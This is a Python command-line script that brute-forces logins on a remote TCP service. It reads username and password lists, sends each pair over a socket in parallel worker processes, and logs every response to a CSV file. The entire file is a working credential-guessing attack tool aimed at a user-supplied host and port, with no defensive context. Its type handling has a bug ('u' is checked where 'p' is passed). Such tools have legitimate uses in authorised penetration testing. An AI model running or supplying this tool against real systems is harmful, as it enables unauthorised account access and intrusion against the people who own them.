import argparse
import socket
import sys
import time
from concurrent.futures import ProcessPoolExecutor
from functools import partial

initialized = False
init_result = None


def init_wrapper(init_func, init_args, func, func_args):
    """ Keeps track of initialization for threads.  Used to ensure that one socket is created per thread.

    Global variables 'initialized' and 'init_result' are unique to each thread.

    Args:
        init_func: Initialization function for each thread
        init_args: Args to pass into initialization function
        func: Function to be executed by threads
        func_args: Args for function that is executed by threads

    Returns: The function that will be executed by threads
    """
    global initialized, init_result
    if not initialized:
        initialized = True
        init_result = init_func(*init_args)
    return func(func_args)


def init_map(executor, initializer, init_args, func, iterator):
    """ Maps a ProcessPoolExecutor to the init_wrapper function.

    Args:
        executor: ProcessPoolExecutor
        initializer: The initialization function for each thread
        init_args: Arguments for the initialization function
        func: Function to be executed by threads
        iterator: Iterator that the threads will consume

    Returns: executor.map
    """
    return executor.map(partial(init_wrapper, initializer, init_args, func), iterator)


def connect(host, port, verbose=None):
    """ Connects to a host on a specific port.

    Args:
        host: Host to connect to
        port: Port to connect to
        verbose: If true, the banner will be printed to stdout

    Returns: socket.socket
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"Connecting to {host} on port {port}")
    s.connect((host, port))

    banner = s.recv(2048)
    if verbose:
        print(banner.decode())
    return s


def login(thread_info):
    """ Attempts to log in to a remote system.  Assumes the remote system is prompting for a username, then a password.

    Args:
        thread_info: Dictionary containing information about what credentials should be used to login

    Returns: response from remote system
    """
    user = thread_info['username']
    password = thread_info['password']
    verbose = thread_info['verbose']
    socket = init_result

    if verbose:
        print("*******")

    print(f"Attempting login {user}:{password}")

    socket.send((user + '\n').encode())
    time.sleep(.2)
    result = socket.recv(2048)

    if verbose:
        print(result.decode())

    socket.send((password + '\n').encode())
    time.sleep(.2)
    result = socket.recv(2048).decode()

    if verbose:
        print(result)

    thread_info['result'] = result.replace("\n", "\t")
    return thread_info


def read_input_file(path, _type, delimiter=None):
    """ Reads a list of usernames and/or passwords from a file.

    Args:
        path: path to the list of usernames and/or passwords
        _type: specifies whether it is a list of usernames or usernames/passwords
        delimiter: used to split the string if it is a list of usernames/passwords

    Returns: list of usernames and/or passwords
    """
    with open(path, "r") as f:
        lines = f.read().splitlines()

    if _type == "up":
        return [x.split(delimiter) for x in lines]
    else:
        return lines


def main(host, port, input_file, _type, delimiter, threads, username=None, verbose=None):
    """ Attempts a brute force login of a remote system.

    Args:
        host: target host
        port: target port
        input_file: input file containing usernames and/or passwords
        _type: 'p' specifies a list of passwords, 'up' specifies a list of username/password combinations
        delimiter: if _type='up', this will be used to split the username/password list
        threads: number of threads to use
        username: if _type='p' then this username will be used in combination with every password in the password list
        verbose: if true, additional information will be printed to stdout

    Returns:

    """
    input_list = read_input_file(input_file, _type, delimiter)
    thread_info = []

    if _type == "u":
        for password in input_list:
            thread_info.append({
                "verbose": verbose,
                "username": username,
                "password": password
            })
    else:
        for item in input_list:
            if len(item) > 1:
                thread_info.append({
                    "verbose": verbose,
                    "username": item[0],
                    "password": item[1]
                })

    with ProcessPoolExecutor(max_workers=threads) as executor:
        outputs = init_map(
            executor=executor,
            initializer=connect,
            init_args=(host, port, verbose),
            func=login,
            iterator=thread_info
        )

    o = open("brute_force_output.csv", "w")
    o.write("username,password,result\n")
    for output in outputs:
        csv_string = '"' + output['username'] + '","' + output['password'] + '","' + output['result'] + '"\n'
        o.write(csv_string)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Target IP address or hostname")
    parser.add_argument("port", help="Target port", type=int)
    parser.add_argument("-l", "--list", help="Path to username and/or password list")
    parser.add_argument("-t", "--type",
                        help="Specify if you are using a list of passwords (p) or usernames and password (up)",
                        default="up")
    parser.add_argument("-d", "--delimiter", help="Delimiter in username and password list.", default=":")
    parser.add_argument("-th", "--threads", help="Number of threads to use.  Default is 5.", default=5, type=int)
    parser.add_argument("-u", "--username", help="Username to be used in conjunction with a password list.")
    parser.add_argument("-v", action="store_true", help="Adds verbosity.  Not recommended when using multiple threads.")
    args = parser.parse_args()

    if args.type not in ['p', 'up']:
        sys.exit("-t must be either 'p' or 'up'")

    if args.username and (args.type == "up"):
        sys.exit("-u should not be used while -t is 'up'")

    if args.username is None and args.type == "p":
        sys.exit("-u is required when -t=p")

    main(
        host=args.host,
        port=args.port,
        input_file=args.list,
        _type=args.type,
        delimiter=args.delimiter,
        threads=args.threads,
        username=args.username,
        verbose=args.v
    )
